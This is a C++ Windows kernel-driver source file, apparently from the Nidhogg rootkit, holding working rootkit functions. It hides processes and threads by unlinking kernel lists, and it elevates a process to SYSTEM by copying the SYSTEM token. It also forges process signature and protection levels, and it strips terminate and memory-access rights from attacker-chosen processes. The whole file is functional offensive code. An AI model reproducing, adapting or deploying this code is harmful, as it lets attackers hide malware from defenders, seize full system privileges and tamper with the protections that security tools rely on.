#include "pch.h"
#include "ProcessUtils.hpp"
#include "MemoryHelper.hpp"

ProcessUtils::ProcessUtils() {
	this->ProtectedProcesses.PidsCount = 0;
	this->ProtectedProcesses.LastIndex = 0;
	memset(&this->ProtectedProcesses.Processes, 0, sizeof(this->ProtectedProcesses.Processes));

	this->HiddenProcesses.PidsCount = 0;
	this->HiddenProcesses.LastIndex = 0;
	memset(&this->HiddenProcesses.Processes, 0, sizeof(this->HiddenProcesses.Processes));
	this->ProcessesLock.Init();

	this->ProtectedThreads.TidsCount = 0;
	this->ProtectedThreads.LastIndex = 0;
	memset(&this->ProtectedThreads.Threads, 0, sizeof(this->ProtectedThreads.Threads));
	this->ThreadsLock.Init();
}

ProcessUtils::~ProcessUtils() {
	ClearProtectedProcesses();
	ClearHiddenProcesses();
	ClearProtectedThreads();
}

/*
* Description:
* OnPreOpenProcess is responsible for handling process access operations and remove certain permissions from protected processes.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as process name, handle to the process, process type, etc.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);

	if (Info->KernelHandle)
		return OB_PREOP_SUCCESS;

	if (NidhoggProccessUtils->GetProtectedProcessesCount() == 0)
		return OB_PREOP_SUCCESS;

	auto Process = (PEPROCESS)Info->Object;
	auto pid = HandleToULong(PsGetProcessId(Process));

	// If the process was found on the list, remove permissions for dump / write process memory and kill the process.
	if (NidhoggProccessUtils->FindProcess(pid)) {
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
	}

	return OB_PREOP_SUCCESS;
}

/*
* Description:
* OnPreOpenThread is responsible for handling thread access operations and remove certain permissions from protected threads.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as thread name, handle to the thread, thread type, etc.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);

	if (Info->KernelHandle)
		return OB_PREOP_SUCCESS;

	if (NidhoggProccessUtils->GetProtectedThreadsCount() == 0)
		return OB_PREOP_SUCCESS;

	PETHREAD thread = (PETHREAD)Info->Object;
	ULONG tid = HandleToULong(PsGetThreadId(thread));
	ULONG ownerPid = HandleToULong(PsGetThreadProcessId(thread));
	ULONG callerPid = HandleToULong(PsGetCurrentProcessId());

	// To avoid a situation when a process dies and the thread needs to be closed but it isn't closed, if the killer is its owning process, let it be killed.
	if (callerPid == ownerPid || callerPid == SYSTEM_PROCESS_PID)
		return OB_PREOP_SUCCESS;

	// If the process was found on the list, remove permissions for terminating / setting context / suspending the thread.
	if (NidhoggProccessUtils->FindThread(tid)) {
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_TERMINATE;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_SUSPEND_RESUME;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_SET_CONTEXT;
	}

	return OB_PREOP_SUCCESS;
}

/*
* Description:
* HideProcess is responsible for hiding a process by modifying the process list.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to hide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
NTSTATUS ProcessUtils::HideProcess(ULONG pid) {
	PEPROCESS targetProcess;
	NTSTATUS status = STATUS_SUCCESS;
	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
	ULONG lockOffset = GetProcessLockOffset();

	if (activeProcessLinkListOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
		return STATUS_UNSUCCESSFUL;

	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + activeProcessLinkListOffset);

	// Using the ActiveProcessLinks lock to avoid accessing problems.
	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetProcess + lockOffset);
	ExAcquirePushLockExclusive(listLock);

	// Saving the hidden process' list entry for the future to release it.
	if (!AddHiddenProcess(processListEntry, pid)) {
		ExReleasePushLockExclusive(listLock);
		ObDereferenceObject(targetProcess);
		return STATUS_UNSUCCESSFUL;
	}

	RemoveListLinks(processListEntry);
	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetProcess);

	return status;
}

/*
* Description:
* UnhideProcess is responsible for unhiding a hidden process by modifying the process list.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to unhide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
NTSTATUS ProcessUtils::UnhideProcess(ULONG pid) {
	PEPROCESS targetProcess;
	NTSTATUS status = STATUS_SUCCESS;
	PLIST_ENTRY entryToRestore;

	AutoLock locker(this->ProcessesLock);
	entryToRestore = GetHiddenProcess(pid);

	if (!entryToRestore)
		return STATUS_UNSUCCESSFUL;

	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
	ULONG lockOffset = GetProcessLockOffset();

	if (activeProcessLinkListOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
		return STATUS_UNSUCCESSFUL;

	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + activeProcessLinkListOffset);

	// Using the ActiveProcessLinks lock to avoid accessing problems.
	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetProcess + lockOffset);
	ExAcquirePushLockExclusive(listLock);

	AddListLinks(entryToRestore, processListEntry);

	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetProcess);
	entryToRestore = NULL;
	return status;
}

/*
* Description:
* HideThread is responsible for hiding a thread by modifying the entry thread list.
*
* Parameters:
* @tid	  [ULONG]	 -- TID to hide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
NTSTATUS ProcessUtils::HideThread(ULONG tid) {
	PETHREAD targetThread;
	NTSTATUS status = STATUS_SUCCESS;
	ULONG threadListEntryOffset = GetThreadListEntryOffset();
	ULONG lockOffset = GetThreadLockOffset();

	if (threadListEntryOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
		return STATUS_UNSUCCESSFUL;

	status = PsLookupThreadByThreadId(UlongToHandle(tid), &targetThread);

	if (!NT_SUCCESS(status))
		return status;

	// Using the ThreadListEntry lock to avoid accessing problems.
	PLIST_ENTRY threadListEntry = (PLIST_ENTRY)((ULONG_PTR)targetThread + threadListEntryOffset);
	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetThread + lockOffset);

	ExAcquirePushLockExclusive(listLock);

	__try {
		RemoveEntryList(threadListEntry);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = STATUS_UNSUCCESSFUL;
	}

	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetThread);
	return status;
}

/*
* Description:
* ElevateProcess is responsible for stealing a token from the SYSTEM process and giving it to other process.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to elevate.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully elevated or not.
*/
NTSTATUS ProcessUtils::ElevateProcess(ULONG pid) {
	PEPROCESS privilegedProcess, targetProcess;
	NTSTATUS status = STATUS_SUCCESS;

	// Getting the EProcess of the target and the privileged processes.
	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
	UINT64 tokenOffset = GetTokenOffset();

	if (!NT_SUCCESS(status) || tokenOffset == STATUS_UNSUCCESSFUL)
		return status;

	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);

	if (!NT_SUCCESS(status))
	{
		ObDereferenceObject(targetProcess);
		return status;
	}

	*(UINT64*)((UINT64)targetProcess + tokenOffset) = *(UINT64*)(UINT64(privilegedProcess) + tokenOffset);

	ObDereferenceObject(privilegedProcess);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* FindPidByName is responsible for finding process's PID by name.
*
* Parameters:
* @processName [WCHAR*]	  -- Process name to find.
* @pid		   [ULONG*]	  -- Output found PID.
*
* Returns:
* @status	   [NTSTATUS] -- Whether successfully found or not.
*/
NTSTATUS ProcessUtils::FindPidByName(WCHAR* processName, ULONG* pid) {
	NTSTATUS status = STATUS_SUCCESS;
	PSYSTEM_PROCESS_INFO originalInfo = NULL;
	PSYSTEM_PROCESS_INFO info = NULL;
	ULONG infoSize = 0;

	if (!pid || !processName)
		return STATUS_INVALID_PARAMETER;

	status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (originalInfo)
			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
		originalInfo = (PSYSTEM_PROCESS_INFO)AllocateMemory(infoSize);

		if (!originalInfo)
			break;
		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
	}

	if (!NT_SUCCESS(status) || !originalInfo) {
		if (!originalInfo)
			status = STATUS_INSUFFICIENT_RESOURCES;
		else
			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
		return status;
	}

	// Using another info variable to avoid BSOD on freeing.
	info = originalInfo;

	// Iterating the processes information until our pid is found.
	while (info->NextEntryOffset) {
		if (info->ImageName.Buffer && info->ImageName.Length > 0) {
			if (_wcsicmp(info->ImageName.Buffer, processName) == 0) {
				*pid = HandleToULong(info->UniqueProcessId);
				break;
			}
		}
		info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
	}

	if (originalInfo)
		ExFreePoolWithTag(originalInfo, DRIVER_TAG);
	return status;
}

/*
* Description:
* AddHiddenProcess is responsible for adding a hidden process to the list of hidden processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to add.
*
* Returns:
* @status [bool]  -- Whether successfully added or not.
*/
bool ProcessUtils::AddHiddenProcess(PLIST_ENTRY entry, DWORD pid) {
	for (ULONG i = 0; i < MAX_PIDS; i++) {
		if (this->HiddenProcesses.Processes[i].Pid == 0) {
			this->HiddenProcesses.Processes[i].ListEntry = entry;
			this->HiddenProcesses.Processes[i].Pid = pid;

			if (i > this->HiddenProcesses.LastIndex)
				this->HiddenProcesses.LastIndex = i;
			this->HiddenProcesses.PidsCount++;
			return true;
		}
	}
	return false;
}

/*
* Description:
* GetHiddenProcess is responsible for searching if a process exists in the list of hidden processes.
*
* Parameters:
* @pid	  [ULONG]	    -- PID to search.
*
* Returns:
* @entry  [PLIST_ENTRY] -- If found, the process list entry.
*/
PLIST_ENTRY ProcessUtils::GetHiddenProcess(DWORD pid) {
	PLIST_ENTRY entry = NULL;
	ULONG newLastIndex = 0;

	for (ULONG i = 0; i <= this->HiddenProcesses.LastIndex; i++) {
		if (this->HiddenProcesses.Processes[i].Pid == pid) {
			entry = this->HiddenProcesses.Processes[i].ListEntry;
			this->HiddenProcesses.Processes[i].Pid = 0;

			if (i == this->HiddenProcesses.LastIndex)
				this->HiddenProcesses.LastIndex = newLastIndex;
			this->HiddenProcesses.PidsCount--;
			break;
		}
		else if (this->HiddenProcesses.Processes[i].Pid != 0)
			newLastIndex = i;
	}
	return entry;
}

/*
* Description:
* FindProcess is responsible for searching if a process exists in the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to search.
*
* Returns:
* @status [bool]  -- Whether found or not.
*/
bool ProcessUtils::FindProcess(ULONG pid) {
	AutoLock locker(this->ProcessesLock);

	for (ULONG i = 0; i <= this->ProtectedProcesses.LastIndex; i++)
		if (this->ProtectedProcesses.Processes[i] == pid)
			return true;
	return false;
}

/*
* Description:
* AddProcess is responsible for adding a process to the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to add.
*
* Returns:
* @status [bool]  -- Whether successfully added or not.
*/
bool ProcessUtils::AddProcess(ULONG pid) {
	AutoLock locker(this->ProcessesLock);

	for (ULONG i = 0; i < MAX_PIDS; i++)
		if (this->ProtectedProcesses.Processes[i] == 0) {
			this->ProtectedProcesses.Processes[i] = pid;
			this->ProtectedProcesses.PidsCount++;

			if (i > this->ProtectedProcesses.LastIndex)
				this->ProtectedProcesses.LastIndex = i;
			return true;
		}
	return false;
}

/*
* Description:
* RemoveProcess is responsible for remove a process from the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to remove.
*
* Returns:
* @status [bool]  -- Whether successfully removed or not.
*/
bool ProcessUtils::RemoveProcess(ULONG pid) {
	ULONG newLastIndex = 0;
	AutoLock locker(this->ProcessesLock);

	for (ULONG i = 0; i <= this->ProtectedProcesses.LastIndex; i++) {
		if (this->ProtectedProcesses.Processes[i] == pid) {
			this->ProtectedProcesses.Processes[i] = 0;

			if (i == this->ProtectedProcesses.LastIndex)
				this->ProtectedProcesses.LastIndex = newLastIndex;
			this->ProtectedProcesses.PidsCount--;
			return true;
		}
		else if (this->ProtectedProcesses.Processes[i] != 0)
			newLastIndex = i;
	}
	return false;
}

/*
* Description:
* FindThread is responsible for searching if a thread exists in the list of protected threads.
*
* Parameters:
* @tid	  [ULONG] -- TID to search.
*
* Returns:
* @status [bool]  -- Whether found or not.
*/
bool ProcessUtils::FindThread(ULONG tid) {
	AutoLock locker(this->ThreadsLock);

	for (ULONG i = 0; i <= this->ProtectedThreads.LastIndex; i++)
		if (this->ProtectedThreads.Threads[i] == tid)
			return true;
	return false;
}

/*
* Description:
* AddThread is responsible for adding a thread to the list of protected threads.
*
* Parameters:
* @tid	  [ULONG] -- TID to add.
*
* Returns:
* @status [bool]  -- Whether successfully added or not.
*/
bool ProcessUtils::AddThread(ULONG tid) {
	AutoLock locker(this->ThreadsLock);

	for (ULONG i = 0; i < MAX_TIDS; i++)
		if (this->ProtectedThreads.Threads[i] == 0) {
			this->ProtectedThreads.Threads[i] = tid;
			this->ProtectedThreads.TidsCount++;

			if (i > this->ProtectedThreads.LastIndex)
				this->ProtectedThreads.LastIndex = i;
			return true;
		}
	return false;
}

/*
* Description:
* RemoveThread is responsible for remove a thread from the list of protected threads.
*
* Parameters:
* @tid	  [ULONG] -- TID to remove.
*
* Returns:
* @status [bool]  -- Whether successfully removed or not.
*/
bool ProcessUtils::RemoveThread(ULONG tid) {
	ULONG newLastIndex = 0;
	AutoLock locker(this->ThreadsLock);

	for (ULONG i = 0; i <= this->ProtectedThreads.LastIndex; i++) {
		if (this->ProtectedThreads.Threads[i] == tid) {
			this->ProtectedThreads.Threads[i] = 0;

			if (i == this->ProtectedThreads.LastIndex)
				this->ProtectedThreads.LastIndex = newLastIndex;
			this->ProtectedThreads.TidsCount--;
			return true;
		}
		else if (this->ProtectedThreads.Threads[i] != 0)
			newLastIndex = i;
	}
	return false;
}

/*
* Description:
* RemoveListLinks is responsible for modifying the list by connecting the previous entry to the next entry and by
* that "removing" the current entry.
*
* Parameters:
* @current [PLIST_ENTRY] -- Current process entry.
*
* Returns:
* There is no return value.
*/
void ProcessUtils::RemoveListLinks(PLIST_ENTRY current) {
	PLIST_ENTRY previous;
	PLIST_ENTRY next;

	previous = current->Blink;
	next = current->Flink;

	previous->Flink = next;
	next->Blink = previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	current->Blink = (PLIST_ENTRY)&current->Flink;
	current->Flink = (PLIST_ENTRY)&current->Flink;
}

/*
* Description:
* AddListLinks is responsible for modifying the list by connecting an entry to specific target.
*
* Parameters:
* @current [PLIST_ENTRY] -- Current process entry.
*
* Returns:
* There is no return value.
*/
void ProcessUtils::AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target) {
	PLIST_ENTRY next;

	next = target->Flink;

	current->Blink = target;
	current->Flink = next;

	next->Blink = current;
	target->Flink = current;
}

/*
* Description:
* SetProcessSignature is responsible for removing or adding process protection to a certain process.
*
* Parameters:
* @pid	   [ULONG]    -- The id of the process that need to add or remove protection to.
* @protect [bool]     -- Whether to add or remove the protection.
*
* Returns:
* @status  [NTSTATUS] -- Whether the operation was successful or not.
*/
NTSTATUS ProcessUtils::SetProcessSignature(ProcessSignature* ProcessSignature) {
	PEPROCESS process;
	NTSTATUS status = STATUS_SUCCESS;

	status = PsLookupProcessByProcessId(ULongToHandle(ProcessSignature->Pid), &process);

	if (!NT_SUCCESS(status))
		return status;

	UCHAR newSignatureLevel = (ProcessSignature->SignerType << 4) | ProcessSignature->SignatureSigner;
	PPROCESS_SIGNATURE processSignature = (PPROCESS_SIGNATURE)(UINT64(process) + GetSignatureLevelOffset());

	processSignature->SignatureLevel = newSignatureLevel;
	processSignature->Protection.Type = ProcessSignature->SignerType;
	processSignature->Protection.Signer = ProcessSignature->SignatureSigner;

	ObDereferenceObject(process);
	return status;
}

/*
* Description:
* ClearProtectedProcesses is responsible for cleaning the protected processes array.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void ProcessUtils::ClearProtectedProcesses() {
	AutoLock locker(this->ProcessesLock);

	memset(&this->ProtectedProcesses.Processes, 0, sizeof(this->ProtectedProcesses.Processes));
	this->ProtectedProcesses.PidsCount = 0;
	this->ProtectedProcesses.LastIndex = 0;
}

/*
* Description:
* ClearHiddenProcesses is responsible for cleaning the hidden processes array.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void ProcessUtils::ClearHiddenProcesses() {
	AutoLock locker(this->ProcessesLock);

	memset(&this->HiddenProcesses.Processes, 0, sizeof(this->HiddenProcesses.Processes));
	this->HiddenProcesses.PidsCount = 0;
	this->HiddenProcesses.LastIndex = 0;
}

/*
* Description:
* ClearProtectedThreads is responsible for cleaning the protected threads array.
*
* Parameters:
* There are no parameters.
*
* Returns:
* There is no return value.
*/
void ProcessUtils::ClearProtectedThreads() {
	AutoLock locker(this->ThreadsLock);

	memset(&this->ProtectedThreads.Threads, 0, sizeof(this->ProtectedThreads.Threads));
	this->ProtectedThreads.TidsCount = 0;
	this->ProtectedThreads.LastIndex = 0;
}

/*
* Description:
* QueryProtectedProcesses is responsible for returning a list of protected processes.
*
* Parameters:
* @list [ProtectedProcessesList*] -- Output protected processes list.
*
* Returns:
* There is no return value.
*/
void ProcessUtils::QueryProtectedProcesses(OutputProtectedProcessesList* list) {
	ULONG outputIndex = 0;

	AutoLock locker(this->ProcessesLock);
	list->PidsCount = this->ProtectedProcesses.PidsCount;

	for (ULONG i = 0; i < this->ProtectedProcesses.PidsCount; i++) {
		if (this->ProtectedProcesses.Processes[i] != 0) {
			list->Processes[outputIndex] = this->ProtectedProcesses.Processes[i];
			outputIndex++;
		}
	}
}

/*
* Description:
* QueryProtectedThreads is responsible for returning a list of protected threads.
*
* Parameters:
* @list [ThreadsList*] -- Output protected threads list.
*
* Returns:
* There is no return value.
*/
void ProcessUtils::QueryProtectedThreads(OutputThreadsList* list) {
	ULONG outputIndex = 0;

	AutoLock locker(this->ThreadsLock);
	list->TidsCount = this->ProtectedThreads.TidsCount;

	for (ULONG i = 0; i < this->ProtectedThreads.TidsCount; i++) {
		if (this->ProtectedThreads.Threads[i] != 0) {
			list->Threads[outputIndex] = this->ProtectedThreads.Threads[i];
			outputIndex++;
		}
	}
}